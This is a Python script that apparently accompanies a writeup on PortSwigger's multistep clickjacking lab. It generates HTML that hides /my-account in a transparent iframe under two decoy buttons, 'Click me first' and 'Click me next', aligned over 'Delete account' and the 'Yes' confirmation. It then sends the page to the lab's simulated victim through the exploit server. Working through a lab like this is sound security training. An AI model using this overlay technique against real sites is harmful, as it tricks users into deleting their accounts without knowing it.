#!/usr/bin/env python3
"""
Multistep clickjacking
PortSwigger Web Security Academy -- Clickjacking

Companion script for the writeup: 05-multistep-clickjacking.md

What this does:
    Frames /my-account with TWO decoy overlays stacked on the exploit page from the
    start: one positioned for the real "Delete account" button, one positioned for
    the "Yes" confirmation button that only appears after the iframe navigates
    following the first click. The victim's first click ("Click me first") hits
    "Delete account" and triggers that internal navigation; because the second decoy
    was already placed for the confirmation page's layout, the victim's next click
    ("Click me next") lands on "Yes" without the attacker needing to detect the
    navigation or re-render anything. Delivered through the lab's own exploit server
    to the simulated victim.

    Both offsets -- top:491/left:50 for "Delete account", top:288/left:210 for "Yes"
    -- were measured directly against each button's getBoundingClientRect() at the
    same 500px iframe width, with body { margin: 0 } reset (see the writeup, which
    also describes verifying alignment with "Test me first"/"Test me next" decoy text
    before switching to the real "Click me" text -- that verification was a manual,
    one-time step done in a browser, not something this script re-does). The
    coordinates are hardcoded rather than re-measured at runtime because
    PortSwigger's lab template renders both pages identically across every lab
    instance -- only the subdomain changes, not the layout -- so they transfer as-is.

Usage:
    python 05-multistep-clickjacking.py <lab-url>
    e.g. python 05-multistep-clickjacking.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install websockets   # optional -- fallback for exploit-server URL discovery
"""

import re
import sys
import time
import pathlib
import httpx

IFRAME_WIDTH = 500
IFRAME_HEIGHT = 700
OPACITY = 0.00001

STEPS = [
    {"text": "Click me first", "top": 491, "left": 50},   # "Delete account" on /my-account
    {"text": "Click me next", "top": 288, "left": 210},   # "Yes" on the confirmation page
]


def _get_csrf(client: httpx.Client, path: str = "/login") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str | None:
    """Find the exploit server URL embedded in the lab page (static HTML, then WebSocket header)."""
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if m:
        return m.group(1).rstrip("/")

    base = str(client.base_url).rstrip("/")
    ws_url = base.replace("https://", "wss://").replace("http://", "ws://") + "/academyLabHeader"
    try:
        import websockets.sync.client as ws_sync
        with ws_sync.connect(ws_url, close_timeout=5) as ws:
            data = ws.recv(timeout=5)
            m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', str(data))
            if m:
                return m.group(1).rstrip("/")
    except Exception:
        pass
    return None


def _deliver_to_victim(exploit_url: str, html: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": html,
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def build_exploit_html(target_url: str) -> str:
    step_overrides = ""
    step_divs = ""
    base_classes = []
    for i, step in enumerate(STEPS):
        cls = f"step{i + 1}"
        base_classes.append(f".{cls}")
        if i > 0:
            step_overrides += f"  .{cls} {{ top: {step['top']}px; left: {step['left']}px; }}\n"
        step_divs += f'<div class="{cls}">{step["text"]}</div>\n'

    first_step = STEPS[0]
    shared_selector = ", ".join(base_classes)

    return (
        "<style>\n"
        "  body { margin: 0; padding: 0; }\n"
        f"  iframe {{ position: relative; width: {IFRAME_WIDTH}px; height: {IFRAME_HEIGHT}px; "
        f"opacity: {OPACITY}; z-index: 2; }}\n"
        f"  {shared_selector} {{\n"
        "    position: absolute;\n"
        f"    top: {first_step['top']}px;\n"
        f"    left: {first_step['left']}px;\n"
        "    z-index: 1;\n"
        "    font-size: 20px;\n"
        "    cursor: pointer;\n"
        "  }\n"
        f"{step_overrides}"
        "</style>\n"
        f"{step_divs}"
        f'<iframe src="{target_url}"></iframe>'
    )


def solve(lab_url: str) -> None:
    target = f"{lab_url}/my-account"

    r = httpx.get(target, follow_redirects=True, timeout=20)
    print(f"[*] {target} -- X-Frame-Options: {r.headers.get('x-frame-options', '(not set)')}")

    html = build_exploit_html(target)
    out_path = pathlib.Path(__file__).with_suffix(".html")
    out_path.write_text(html, encoding="utf-8")
    print(f"[+] Exploit HTML written to {out_path}")

    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20,
                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    client.get("/")  # warm up, grab session cookie

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] Could not find the exploit server URL -- open the lab in a browser once first.")
        return

    if not _login(client):
        print("[-] Login as wiener/peter failed -- the account victim session may not be primed.")

    print(f"[*] Delivering exploit via {exploit_url} (two decoys: delete, then confirm) ...")
    if not _deliver_to_victim(exploit_url, html):
        print("[-] Delivery to exploit server failed.")
        return

    time.sleep(5)
    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the victim's two clicks deleted, then confirmed, the account.")
    else:
        print("[-] Not solved yet -- verify the exploit server actually delivered to the victim.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
